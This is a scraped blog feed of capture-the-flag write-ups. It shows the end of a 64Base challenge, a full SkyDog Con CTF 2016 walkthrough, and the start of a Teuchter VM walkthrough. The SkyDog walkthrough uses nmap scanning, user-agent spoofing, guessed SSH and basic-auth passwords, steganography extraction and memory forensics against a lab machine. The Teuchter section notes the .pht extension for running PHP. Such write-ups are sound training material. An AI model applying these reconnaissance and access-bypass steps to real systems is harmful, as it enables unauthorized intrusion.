<pre><code>                                       I n t e r i o r ,   L e v e l   6
                                       ---------------------------------
     ____           ____
    / __ \_________/ __ \        Base command personnel,  control rooms,
   / /  \___________/  \ \       rooms,  trade  mission,  and diplomatic
   \ \ o     oo      o / /       offices are located on this level.
   / /       oo----.   \ \
  / /   8  __oo     `.1 \ \      1 ....... Sensor Monitors, Tractor Beam
</code></pre>

<p>   <strong>/ /\    .~  ||   2   \  \ __                       and Shield Controls
  / </strong>/  \ .&lsquo; 9.&ndash;&rsquo;<code>-.      | /\__ \  2 ....................... Computer Room
 / /   o  \|__:   o  :_____|/ o  \ \ 3 ....................... Meeting Rooms
 \ \__  7 .---: 10   :------.3 __/ / 4 ...... Officers' and Pilots' Quarters
  \__ \  /    </code>&ndash;..&ndash;&lsquo;        \/ __/  5 &hellip; Trade Mission, Diplomatic Offices</p>

<pre><code> \ \/\   5   ||          / /     6 ........... Base Commander's Quarters
  \ \ `.     ||    4    / /                                  and offices
   \ \ o~`---||      o / /       7 ............ Officer Recreation Rooms
   / /6  ____||_____   \ \       8 ............................. Offices
   \ \__/ _________ \__/ /       9 ................... Base Control Room
    \____/         \____/        10 ..................... Reception Area
</code></pre>

<hr />

<p>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</p>

<pre><code>                                       I n t e r i o r ,   L e v e l   7
                                       ---------------------------------
    __             __
   /_]\           /[_\        The TIE Fighter  Hanger  Deck  houses  the
   \ \,===========./ /        garrison's TIE fighters in standard-design
   //:o-----------o:\\        ceiling racks.  Bases are usually equipped
  /// X  X X X X  X \\\       with  30 TIE fighters and five TIE bombers
 /// X X  X_X_X  X X \\\      (a single  bomber  takes  up the same rack
</code></pre>

<p>  <strong>/// X X   [</strong><em>]   X X \_</em>   space as two fighters).  Five  to 15 ships
 /_/o X X  1 &amp;/3&amp;    X X o_/\  are on constant  patrol,  depending on the
 ]<em>\ X X   &lt;\</em>//>       //_[/  base&rsquo;s readiness level.</p>

<pre><code>\\\ X X   \&gt;&amp;&lt;/2  X []///
 \\\ X X   []    X []///      1 .............. TIE Fighter Ceiling Racks
  \\\ X   [] []     ///                           (holds up to 40 craft)
   \\:o-----------o://        2 ............. Lift Platforms, to Level 8
   /_/`==========='\_\        3 .................. Flight Control Center
   \_]/           \[_/        X ............................ TIE Fighter
                              [] ............................ TIE Bomber
</code></pre>

<hr />

<p>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</p>

<pre><code>                                       I n t e r i o r ,   L e v e l   8
                                       ---------------------------------
                                                  (not shown)
</code></pre>

<p>  The Flight Deck contains the  tractor beam  generators which catapult out-
  going craft into the open sky and reel in landing ships. Pilots relinquish
  control of  their ships during take off and landing because of the limited
  maneuvering area within the chutes.</p>

<hr />

<p>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</p>

<pre><code>                           S u b - L e v e l   I n s t a l l a t i o n s
                           ---------------------------------------------
                                            (not shown)
</code></pre>

<p>  A large underground section of the base  houses the main power and back-up
  generators, the tractor beam and deflector shield generators, the environ-
  ment  control  station,  and  the  waste  disposal and refuse units.  Some
  storage facilities are also located here.</p>

<hr />

<p>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Version 1.9 (released 941211).
 Pictures by Lennert Stock  (LS),  Rowan Crawford (-Row),  Ray Brunner,  Bob
 VanderClay and Joe Rumsey.  The pictures work best when shown on a white on
 black screen  (except for some faces)  with a not too fancy font. Contribu-
 tions welcome, email to the adress below. Sources LS: The Star Wars Source-
 book,  Star Wars Imperial Sourcebook,  The Star Wars Rebel Alliance Source-
 book, Star Wars: The Roleplaying Game (2nd Ed) all by West End Games, Inc.</p>

<hr />

<hr />

<p> |<strong><strong><strong>||</strong></strong></strong>||<strong><strong><strong>||</strong></strong></strong>||<strong><strong><strong>||</strong></strong></strong>||<strong><strong><strong>||</strong></strong></strong>||______|</p>

<hr />

<p> | \ | | / <strong> \ \        / / \ \   / // </strong> \ | |  | |( )|  <strong> \ |  </strong><strong>|
 |  \| || |  | |\ \  /\  / /   \ _/ /| |  | || |  | ||/ | |</strong>) || |<strong>  <br/>
 | . ` || |  | | \ \/  \/ /     \   / | |  | || |  | |   |  _  / |  </strong>| <br/>
 | |\  || |<strong>| |  \  /\  /       | |  | |</strong>| || |<strong>| |   | | \ \ | |</strong><strong><br/>
 |<em>| _| _</em></strong>/    \/  \/        |<em>|   _</em><strong>/  _</strong><em>/    |</em>|  _\|______|</p>

<pre><code>                            _  ______  _____  _____  _                
         /\                | ||  ____||  __ \|_   _|| |               
        /  \               | || |__   | |  | | | |  | |               
       / /\ \          _   | ||  __|  | |  | | | |  | |               
      / ____ \        | |__| || |____ | |__| |_| |_ |_|               
     /_/    \_\        \____/ |______||_____/|_____|(_)               
</code></pre>

<hr />

<p> |<strong><strong><strong>||</strong></strong></strong>||<strong><strong><strong>||</strong></strong></strong>||<strong><strong><strong>||</strong></strong></strong>||<strong><strong><strong>||</strong></strong></strong>||______|</p>

<pre><code>                I hope you enjoyed this challenge
                Please leave comments &amp; feedback
                @ https://www.vulnhub.com/?q=64base
                -----------------------------------
                64Base Challenge by 3mrgnc3
                https://3mrgnc3.ninja/challenges   
                -----------------------------------
</code></pre>

<p>```</p>

<p>```
/ Peace is a lie, there is only passion.  \
| Through passion, I gain strength.       |
| Through strength, I gain power. Through |
| power, I gain victory. Through victory, |
| my chains are broken. The Force shall   |
\ free me.                                /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SkyDog Con CTF 2016 - Catch Me If You Can]]></title>
    <link href="http://chousensha.github.io/blog/2018/10/20/skydog-con-ctf-2016-catch-me-if-you-can/"/>
    <updated>2018-10-20T11:53:46-04:00</updated>
    <id>http://chousensha.github.io/blog/2018/10/20/skydog-con-ctf-2016-catch-me-if-you-can</id>
    <content type="html"><![CDATA[<p>For this box, you have to find 8 flags, each containing an MD5 hash.</p>

<!-- more -->


<p>```
nmap -T4 -sC -sV -p- 192.168.145.136</p>

<p>PORT      STATE  SERVICE  VERSION
22/tcp    closed ssh
80/tcp    open   http     Apache httpd 2.4.18 ((Ubuntu))
|<em>http-server-header: Apache/2.4.18 (Ubuntu)
|</em>http-title: SkyDog Con CTF 2016 &ndash; Catch Me If You Can
443/tcp   open   ssl/http Apache httpd 2.4.18 ((Ubuntu))
|<em>http-server-header: Apache/2.4.18 (Ubuntu)
|</em>http-title: SkyDog Con CTF 2016 &ndash; Catch Me If You Can
| ssl-cert: Subject: commonName=Network Solutions EV Server CA 2/organizationName=Network Solutions L.L.C./stateOrProvinceName=VA/countryName=US
| Not valid before: 2016-09-21T14:51:57
|<em>Not valid after:  2017-09-21T14:51:57
|</em>ssl-date: TLS randomness does not represent time
| tls-alpn:
|   http/1.1
22222/tcp open   ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b6:64:7c:d1:55:46:4e:50:e3:ba:cf:4c:1e:81:f9:db (RSA)
|   256 ef:17:df:cc:db:2e:c5:24:e3:9e:25:16:3d:25:68:35 (ECDSA)
|_  256 0e:1b:3f:c3:4a:56:a0:ef:4d:2a:af:a1:7e:94:d2:06 (ED25519)
```</p>

<h2>Flag #1 Don’t go Home Frank! There’s a Hex on Your House.</h2>

<p>Starting with the web server, the web page is the homepage of the SkyDog con. Poking through the source, I found a suspicious comment:</p>

<p>```</p>

<!--[If IE4]><script src="http://chousensha.github.io/oldIE/html5.js"></script><![Make sure to remove this before going to PROD]-->


<p>
```</p>

<p>Going to the above mentioned JS file, on the first line we find a hex string:</p>

<p><code>
/* 666c61677b37633031333230373061306566373164353432363633653964633166356465657d */
</code></p>

<p>Decoded, it gives the first flag: <code>flag{7c0132070a0ef71d542663e9dc1f5dee}</code>. And decoding the MD5 hash gives a hint: <code>nmap</code></p>

<h2>Flag #2 Obscurity or Security?</h2>

<p>I already ran Nmap and saw that SSH is listening on port 22222. Trying to SSH as frank gives the next flag:</p>

<p>```
ssh <a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#111;&#x3a;&#102;&#114;&#97;&#x6e;&#107;&#x40;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#56;&#46;&#x31;&#x34;&#53;&#46;&#x31;&#x33;&#54;">&#102;&#114;&#97;&#x6e;&#x6b;&#x40;&#x31;&#x39;&#x32;&#46;&#x31;&#x36;&#x38;&#46;&#x31;&#52;&#53;&#x2e;&#49;&#51;&#54;</a> -p 22222
The authenticity of host &lsquo;[192.168.145.136]:22222 ([192.168.145.136]:22222)&rsquo; can&rsquo;t be established.
ECDSA key fingerprint is SHA256:DeCMZ74o5wesBHFLyaVY7UTCA7mW+bx6WroHm6AgMqU.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &lsquo;[192.168.145.136]:22222&rsquo; (ECDSA) to the list of known hosts.</p>

<h6>#</h6>

<h1>WARNING</h1>

<h1>FBI &ndash; Authorized access only!                 #</h1>

<h1>Disconnect IMMEDIATELY if you are not an authorized user!!!</h1>

<h1>All actions Will be monitored and recorded</h1>

<h1>Flag{53c82eba31f6d416f331de9162ebe997}</h1>

<h6>#</h6>

<p><a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#58;&#x66;&#114;&#97;&#x6e;&#107;&#64;&#x31;&#57;&#x32;&#46;&#x31;&#54;&#56;&#x2e;&#x31;&#x34;&#x35;&#x2e;&#x31;&#51;&#54;">&#102;&#114;&#97;&#110;&#107;&#x40;&#49;&#x39;&#x32;&#46;&#49;&#x36;&#56;&#46;&#49;&#52;&#x35;&#46;&#x31;&#x33;&#x36;</a>&rsquo;s password:
```</p>

<p>The decoded hint is <code>encrypt</code></p>

<h2>Flag #3 Be Careful Agent, Frank Has Been Known to Intercept Traffic Our Traffic.</h2>

<p>Remember that Nmap found also port 443 open, so I switched to https to check it out and was greeted by a self-signed certificate. Viewing the certificate gives the third flag: <code>flag3{f82366a9ddc064585d54e3f78bde3221}</code></p>

<p><img class="center" src="/images/pentest/skydogctf/flag3.jpg" title="&lsquo;flag3&rsquo; &lsquo;flag3&rsquo;" ></p>

<p>And the next hint is <code>personnel</code></p>

<h2>Flag #4 A Good Agent is Hard to Find.</h2>

<p>I tried navigating to /personnel on the web server and it gave me the following message:</p>

<p><code>
ACCESS DENIED!!! You Do Not Appear To Be Coming From An FBI Workstation. Preparing Interrogation Room 1. Car Batteries Charging....
</code></p>

<p>So we need a specific user agent. Remembering the included JS file of the first flag, that hinted towards an old Internet Explorer version, I revisited it and searched for the string <em>fbi</em> inside it and found the lines:</p>

<p><code>
/* maindev -  6/7/02 Adding temporary support for IE4 FBI Workstations */
/* newmaindev -  5/22/16 Last maindev was and idoit and IE4 is still Gold image -@Support doug.perterson@fbi.gov */
</code></p>

<p>So FBI agents use IE4 on their workstations. Cool, nothing catastrophically wrong there. I grabbed an IE4 user agent from <a href="http://www.useragentstring.com/pages/useragentstring.php?name=Internet+Explorer,">http://www.useragentstring.com/pages/useragentstring.php?name=Internet+Explorer,</a> changed my User Agent to <code>User-Agent: Mozilla/4.0 WebTV/2.6 (compatible; MSIE 4.0)</code>, and went straight to the FBI portal!</p>

<p><img class="center" src="/images/pentest/skydogctf/fbiportal.png" title="&lsquo;fbi portal&rsquo; &lsquo;fbi portal&rsquo;" ></p>

<p>The flag is on the page: <code> flag{14e10d570047667f904261e6d08f520f}</code>, and the decoded value is <code>evidence</code></p>

<h2>Flag #5 The Devil is in the Details &ndash; Or is it Dialogue? Either Way, if it’s Simple, Guessable, or Personal it Goes Against Best Practices</h2>

<p>Following up on the clue <em>new+flag</em>, I tried navigating to 192.168.145.136/newevidence and a basic authentication prompt asked me for credentials. On the FBI portal we have the message &ldquo;Welcome Agent Hanratty&rdquo;. A quick Google reveals that this is a reference to agent Carl Hanratty from the movie Catch Me If You Can. I went through the dialogue (hint hint) on the <a href="https://www.imdb.com/title/tt0264464/characters/nm0000158">IMDB page</a> to find out Carl&rsquo;s daughter is called Grace (simple? guessable? personal?). I tried some combinations in the pop up until I found the right one is <em>carl.hanratty/Grace</em> (remember the naming convention of doug.perterson)</p>

<p><img class="center" src="/images/pentest/skydogctf/newevidence.png" title="&lsquo;new evidence&rsquo; &lsquo;new evidence&rsquo;" ></p>

<p>The flag is in the Evidence Summary File: <code>flag{117c240d49f54096413dd64280399ea9}</code>. The hint is <code>panam</code></p>

<h2>Flag #6 Where in the World is Frank?</h2>

<p>For this one you have to work with the other 2 files from the page, the image and the PDF invoice. The invoice mentions an encryption consultation project:</p>

<p><img class="center" src="/images/pentest/skydogctf/invoice.jpg" title="&lsquo;invoice&rsquo; &lsquo;invoice&rsquo;" ></p>

<p>This might suggest the use of steganography in the image, and this is confirmed if you search for Stefan Hetzl, it turns out he&rsquo;s the author of steghide! And we have the previous hint of panam, which is the passphrase in this case:</p>

<p>```
steghide extract -sf image.jpg
Enter passphrase:
wrote extracted data to &ldquo;flag.txt&rdquo;.
root@kali:~/Downloads# cat flag.txt
flag{d1e5146b171928731385eb7ea38c37b8}
=ILoveFrance</p>

<p>clue=iheartbrenda
```</p>

<h2>Flag #7 Frank Was Caught on Camera Cashing Checks and Yelling &ndash; I’m The Fastest Man Alive!</h2>

<p>This was a movie reference and I had to look it up in other solutions&hellip;&ldquo;I’m The Fastest Man Alive!&rdquo; is a reference to The Flash, whose real name is Barry Allen. For the next part, log in to SSH with the the username <em>barryallen</em> and the password <em>iheartbrenda</em>.</p>

<p><code>
ssh barryallen@192.168.145.136 -p 22222
[...]
barryallen@skydogconctf2016:~$ cat flag.txt
flag{bd2f6a1d5242c962a05619c56fa47ba6}
</code></p>

<p>And the hint for the last flag is <code>theflash</code>.</p>

<h2>Flag #8 Franks Lost His Mind or Maybe it’s His Memory. He’s Locked Himself Inside the Building. Find the Code to Unlock the Door Before He Gets Himself Killed!</h2>

<p>Inside barryallen&rsquo;s home there&rsquo;s a 72M ZIP file called security-system.data:</p>

<p><code>
barryallen@skydogconctf2016:~$ file security-system.data
security-system.data: Zip archive data, at least v2.0 to extract
</code></p>

<p>I transferred it to my machine with scp:</p>

<p>```
scp -P 22222 barryallen@192.168.145.136:security-system.data .</p>

<h6>#</h6>

<h1>WARNING</h1>

<h1>FBI &ndash; Authorized access only!                 #</h1>

<h1>Disconnect IMMEDIATELY if you are not an authorized user!!!</h1>

<h1>All actions Will be monitored and recorded</h1>

<h1>Flag{53c82eba31f6d416f331de9162ebe997}</h1>

<h6>#</h6>

<p><a href="&#x6d;&#x61;&#105;&#108;&#x74;&#111;&#x3a;&#98;&#97;&#x72;&#114;&#121;&#97;&#x6c;&#108;&#x65;&#x6e;&#x40;&#49;&#x39;&#50;&#46;&#x31;&#54;&#56;&#x2e;&#x31;&#52;&#53;&#46;&#x31;&#x33;&#x36;">&#98;&#x61;&#114;&#114;&#x79;&#x61;&#108;&#108;&#x65;&#110;&#64;&#49;&#57;&#x32;&#x2e;&#x31;&#54;&#56;&#x2e;&#49;&#x34;&#x35;&#46;&#49;&#51;&#54;</a>&rsquo;s password:
security-system.data                          100%   71MB   6.6MB/s   00:10  <br/>
```</p>

<p>I unzipped the archive, but the file command didn&rsquo;t identify it as something specific, it just said it&rsquo;s data. I ran strings on it and saw various references to memory that seem to be linked to a Windows system. Time for some memory forensics with Volatility!</p>

<p>First, we need to identify what type of image we&rsquo;re working with:</p>

<h2>``` </h2>

<h2>Module ImageInfo</h2>

<p>Identify information for the image</p>

<p>volatility imageinfo -f data
Volatility Foundation Volatility Framework 2.6
INFO    : volatility.debug    : Determining profile based on KDBG search&hellip;</p>

<pre><code>      Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)
                 AS Layer1 : IA32PagedMemoryPae (Kernel AS)
                 AS Layer2 : FileAddressSpace (/root/Downloads/data)
                  PAE type : PAE
                       DTB : 0x33e000L
                      KDBG : 0x80545b60L
      Number of Processors : 1
 Image Type (Service Pack) : 3
            KPCR for CPU 0 : 0xffdff000L
         KUSER_SHARED_DATA : 0xffdf0000L
       Image date and time : 2016-10-10 22:00:50 UTC+0000
 Image local date and time : 2016-10-10 18:00:50 -0400
</code></pre>

<p>```</p>

<p>It&rsquo;s an image of a Windows XP machine! Next, let&rsquo;s look at the processes:</p>

<h2>``` </h2>

<h2>Module PSList</h2>

<p>Print all running processes by following the EPROCESS lists</p>

<p>volatility pslist -f data
Volatility Foundation Volatility Framework 2.6
Offset(V)  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit</p>

<hr />

<p>0x867c6830 System                    4      0     57      171 &mdash;&mdash;&mdash;      0                                                            <br/>
0x86262900 smss.exe                332      4      3       19 &mdash;&mdash;&mdash;      0 2016-10-10 21:59:14 UTC+0000                               <br/>
0x8623b978 csrss.exe               560    332     10      423      0      0 2016-10-10 21:59:14 UTC+0000                               <br/>
0x865ed020 winlogon.exe            588    332     24      512      0      0 2016-10-10 21:59:14 UTC+0000                               <br/>
0x8662d808 services.exe            664    588     15      263      0      0 2016-10-10 21:59:14 UTC+0000                               <br/>
0x866a5670 lsass.exe               676    588     25      356      0      0 2016-10-10 21:59:14 UTC+0000                               <br/>
0x86358a70 vmacthlp.exe            848    664      1       25      0      0 2016-10-10 21:59:14 UTC+0000                               <br/>
0x86651da0 svchost.exe             860    664     21      202      0      0 2016-10-10 21:59:14 UTC+0000                               <br/>
0x865c2790 svchost.exe             944    664     11      258      0      0 2016-10-10 21:59:14 UTC+0000                               <br/>
0x86554020 svchost.exe            1040    664     82     1287      0      0 2016-10-10 21:59:14 UTC+0000                               <br/>
0x866196b8 svchost.exe            1092    664      5       59      0      0 2016-10-10 21:59:14 UTC+0000                               <br/>
0x8643ca18 svchost.exe            1144    664     17      213      0      0 2016-10-10 21:59:15 UTC+0000                               <br/>
0x866fca88 explorer.exe           1540   1520     14      417      0      0 2016-10-10 21:59:16 UTC+0000                               <br/>
0x8656b4d0 spoolsv.exe            1636    664     15      125      0      0 2016-10-10 21:59:16 UTC+0000                               <br/>
0x86338640 VGAuthService.e        1900    664      2       60      0      0 2016-10-10 21:59:25 UTC+0000                               <br/>
0x8667bda0 vmtoolsd.exe           2012    664      9      271      0      0 2016-10-10 21:59:28 UTC+0000                               <br/>
0x864f6440 wmiprvse.exe            488    860     14      251      0      0 2016-10-10 21:59:28 UTC+0000                               <br/>
0x864fbad0 wscntfy.exe             536   1040      1       31      0      0 2016-10-10 21:59:28 UTC+0000                               <br/>
0x85e5dd48 alg.exe                 624    664      8      110      0      0 2016-10-10 21:59:28 UTC+0000                               <br/>
0x866f98b0 vmtoolsd.exe           1352   1540      7      242      0      0 2016-10-10 21:59:29 UTC+0000                               <br/>
0x86674410 ctfmon.exe             1356   1540      1       79      0      0 2016-10-10 21:59:29 UTC+0000                               <br/>
0x865bea48 CCleaner.exe           1388   1540      5      108      0      0 2016-10-10 21:59:29 UTC+0000                               <br/>
0x865c3d78 cmd.exe                1336   1540      1       30      0      0 2016-10-10 22:00:05 UTC+0000                               <br/>
0x8634fbb8 wuauclt.exe            1884   1040      9      198      0      0 2016-10-10 22:00:13 UTC+0000                               <br/>
0x86260a78 wuauclt.exe            1024   1040      6      172      0      0 2016-10-10 22:00:29 UTC+0000                               <br/>
0x8667b488 notepad.exe             268   1540      1       55      0      0 2016-10-10 22:00:41 UTC+0000                               <br/>
0x8640cc10 cmd.exe                1276   2012      0 &mdash;&mdash;&mdash;&mdash;      0      0 2016-10-10 22:00:49 UTC+0000   2016-10-10 22:00:50 UTC+0000
```</p>

<p>I took note of that Notepad process and several cmd.exes and then dumped the files:</p>

<h2>``` </h2>

<h2>Module FileScan</h2>

<p>Pool scanner for file objects</p>

<p>volatility filescan -f data > filelist.txt
Volatility Foundation Volatility Framework 2.6
```</p>

<p>I searched for the string code in the resulting list of files and got a hit:</p>

<p><code>
grep "code" filelist.txt
0x0000000005e612f8      1      0 -W-r-- \Device\HarddiskVolume1\Documents and Settings\test\Desktop\code.txt
0x00000000062e04b0      1      0 R--r-d \Device\HarddiskVolume1\Documents and Settings\test\Recent\code.txt.lnk
0x00000000064900a0      1      0 R--rwd \Device\HarddiskVolume1\WINDOWS\system32\unicode.nls
0x0000000006640bc8      1      0 R--rwd \Device\HarddiskVolume1\Documents and Settings\test\Desktop\code.txt
</code></p>

<p>Maybe this code.txt file is connected to the running Notepad process. I used Volatility&rsquo;s notepad plugin to dump the text found into Notepad:</p>

<h2>``` </h2>

<h2>Module Notepad</h2>

<p>List currently displayed notepad text</p>

<p>volatility notepad -f data
Volatility Foundation Volatility Framework 2.6
Process: 268
Text:
?</p>

<p>Text:
d</p>

<p>Text:</p>

<p>Text:
?</p>

<p>Text:
66 6c 61 67 7b 38 34 31 64 64 33 64 62 32 39 62 30 66 62 62 64 38 39 63 37 62 35 62 65 37 36 38 63 64 63 38 31 7d
```</p>

<p>We have a hex string! Decoding it yields the final flag: <code>flag{841dd3db29b0fbbd89c7b5be768cdc81}</code>. And the decoded value for the last flag is <code>Two[space]little[space]mice</code></p>

<p>This is it for the SkyDog Con CTF machine! I particularly liked the memory forensics part at the end!</p>

<p>```</p>

<hr />

<p>/ Q: Do you know what the death rate \
\ around here is? A: One per person. /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Git me some Irn-Bru ye Teuchter!]]></title>
    <link href="http://chousensha.github.io/blog/2018/10/14/git-me-some-irn-bru-ye-teuchter/"/>
    <updated>2018-10-14T08:21:15-04:00</updated>
    <id>http://chousensha.github.io/blog/2018/10/14/git-me-some-irn-bru-ye-teuchter</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s target is called Teuchter, and yes, apparently that&rsquo;s a word. There is a theme for this machine, and this why this blog post is also..different. ye will need to hang tight to yer sanity for this one. Or drink some Irn-Bru. Ah had to look at other walkthroughs when Ah got stuck and some time was spent checking Scottish references, but it was all worth it!</p>

<p>So, what&rsquo;s a Teuchter? The Wiktionary definition is:</p>

<blockquote><p>(derogatory) A Highlander especially if Gaelic-speaking; a rural Scot in general; (in Glasgow and
surrounding areas) a Scot with a thick accent from outside west-central Scotland.</p></blockquote>

<p>Some hints from the author:</p>

<blockquote><p>This VM is designed to be a bit of a joke/troll so a translator might be useful.</p>

<p>The challenge isn&rsquo;t over with root. I&rsquo;ve done my usual flag shenanigans.</p>

<p>A bit of info security research and knowing yer target helps here.</p>

<p><a href="http://www.jackiestewart.co.uk/jokes/weegie%20windies%202000.htm">http://www.jackiestewart.co.uk/jokes/weegie%20windies%202000.htm</a></p></blockquote>

<p>And this one:</p>

<blockquote><p>Less hochmagandy and more studying is needed for this one!</p></blockquote>

<p>Ah am sure ye have questions, so:</p>

<blockquote><p>hochmagandy &ndash; Scottish a mainly jocular or literary word for sexual intercourse</p></blockquote>

<p>Isn&rsquo;t this a promising start..</p>

<!-- more -->


<p>Nothing much to start from, just a web server:</p>

<p><code>
PORT   STATE SERVICE
80/tcp open  http
|_http-title: Dinnae Pwn Ma Server... Away and Hack some bawbag else!
</code></p>

<p>On the homepage there is just a GIF and a message:</p>

<p><img class="center" src="/images/pentest/teuchter/web.jpg" title="&lsquo;homepage&rsquo; &lsquo;web page&rsquo;" ></p>

<p>Ran exiftool on the picture and found nothing. However, there are several comments in the source code:</p>

<p>```</p>

<!-- Wullie's favourite film is the Breakfast Club -->


<!-- /gallery/ /flicks/ or /telly/ Maybe Jim Kerr can help with the music...?  -->


<!-- not a lot of people know about different extensions, such as .pht for PHP -->


<p>```</p>

<p>Wullie seems to be the central character here..William? Wallace? We do have a Highlander reference above, and it fits the Scottish theme. While Ah was googling, Ah found this gem on the Urban Dictionary:</p>

<p><code>
Wullie is a very caring person who is easy to get on with,
likes all the joys of life.
Meeting and chating to people from all walks of life.
Also known to like a small shandy or two supports the best scottish team the glasgow rangers.
loves to travel and to get home to the family.
what aload of bull shit wullie
</code></p>

<p>Let&rsquo;s get back to the challenge, we have 3 potential web directories to check. In the meantime, Ah have Googled for .pht, since Ah have never seen that extension:</p>

<blockquote><p>The pht file extension is associated with the Partial Hypertext file format.</p>

<p>The pht file stores HTML page that includes a PHP script, dynamically generates HTML, often by
accessing database information.</p>

<p>PHT seems to be very little used format.</p>

<p>Mime types:
application/x-httpd-php
text/html</p></blockquote>

<p>Back to the web server, /gallery/ is full of pictures, and the title is Dirty Foties..which Ah think stands for dirty feet. Because ye walk a lot..(someone needs some Irn-Bru)</p>

<p><img class="center" src="/images/pentest/teuchter/gallery.png" title="&lsquo;dirty foties&rsquo; &lsquo;gallery&rsquo;" ></p>

<p>There are more hints in the source code:</p>

<p>```
<title>Dirty Foties</title>
<body></p>

<h1>We went on a wee sojourn aboot North Kilt Town and here's whit we saw</h1>


<!-- By now, people will be going doolally. Images will open doors once ye -->


<!-- pick up on the nuances whar's ma glass cheque! -->


<p><b></b>
Here&rsquo;s something else made from Girders:</p>

<p><img src="bandit_country.jpg" alt="Andrew Carnegie" height="460" width="968"></p>

<br></br>




<!-- Beware of the milk snatcher -->


<p><b></b>
Here&rsquo;s where the girders used to come from:
<img src="milk_snatcher.jpg" alt="Margaret Roberts" height="409" width="615" align="centre"></p>

<br></br>


<p><b></b>
Wee hoose on the corner:
<img src="embra.jpg" alt="Castle" height="409" width="615" align="centre"></p>

<br></br>




<!-- The video gives triggers to the gallery -->




<!-- Definatly need to find that coded message -->


<p><b></b>
<img src="bigwheel.jpg" alt="Rotating Station" height="460" width="968" align="centre"></p>

<br></br>


<p><b></b>
Then we bumped into Mr Corleone:
<img src="horse_heid.jpg" alt="Kelpies" height="409" width="615" align="centre">
```</p>

<p>North Kilttown is a Scottish town from The Simpsons. Ah searched for the word doolally, even though Ah got the gist from the context. From Wikipedia:</p>

<blockquote><p>&ldquo;Doolally&rdquo;, originally &ldquo;doolally tap&rdquo;, meaning to &lsquo;lose one′s mind&rsquo;, derived from the boredom felt
at the Deolali British Army transit camp.</p></blockquote>

<p>The Urban Dictionary has another priceless definition for a glass cheque:</p>

<blockquote><p>A Glaswegian term: Describes a special glass bottle, containing Irn-Bru, or other similar soft
drink, available in many cornershops in Scotland. The bottle is returnable and currently attracts a
25p refund when ye give the bottle back to the shop. Called a cheque as they are often collected
and cashed (like a cheque)by students and cheap bastards alike either to buy more Bru, or with
enough bottles, some skag.</p></blockquote>

<p>If ye&rsquo;re not curious about what something called Irn-Bru is, ye&rsquo;re a bawheid!</p>

<blockquote><p>The ultimate hangover cure. Tastes best when consumed directly from a 750ml glass bottle.</p>

<p>Another one of Scotland&rsquo;s many national identities.</p>

<p>Scotland is the only country in the world that produces a soft drink that outsells Coca Cola.</p></blockquote>

<p>Ah must try some Irn-Bru! By the way, if ye were wondering, the &ldquo;Wee hoose on the corner&rdquo; is nothing spectacular&hellip;only the Edinburgh Castle! The Kelpies are 30-metre-high horse-head sculptures featuring kelpies&hellip;so what are kelpies? +1 to mythology skill:</p>

<blockquote><p>Kelpie, or water kelpie, is the Scots name given to a shape-shifting water spirit inhabiting the
lochs and pools of Scotland. It has usually been described as appearing as a horse, but is able to
adopt human form</p></blockquote>

<p>How did Ah get in this spiral? Ah had a box to hack..ye know what would help me focus? It starts with Irn and ends with Bru!</p>

<p>The /flicks/ directory gives a 403 Forbidden error, but also discloses the web server version, which is Apache/2.4.18 (Ubuntu) Server</p>

<p>The /telly/ directory also has a picture and 2 videos, along with more hints:</p>

<p>```
<title>STV Embra</title>
<body></p>

<h1>Here's some telly programs fur ye!</h1>


<!-- Mind the hidden messages -->


<p><b></b>
<img src="STV.jpg" alt="STV" height=300" width="400"></p>

<br></br>


<p>Now for some adverts&hellip;.</p>

<br></br>


<!-- noise up those crazy yanks 1st hint to a password -->


<p><video height="300" width="400" controls>
<source src="girders.ogv" type="video/ogg">
</video></p>

<!-- next hint, see how many people make the connection  -->


<!-- between A.G. Barr and the gallery... Aled Jones eh? -->


<p><video height="300" width="400" controls>
<source src="aled.ogv" type="video/ogg">
</video></p>

<br></br>




<!-- Third video gives triggers to the flicks phpinfo -->


<p>By the way, it&rsquo;s only aboot 250 weeks ti Christmas!</p>

<br></br>


<p>```</p>

<p>In case ye forgot about Irn-Bru, here&rsquo;s a reminder:</p>

<blockquote><p>A.G. BARR p.l.c., commonly known as Barr&rsquo;s, is a Scottish soft drink manufacturer, based in
Cumbernauld, Scotland. It manufactures the popular Scottish drink, Irn-Bru</p></blockquote>

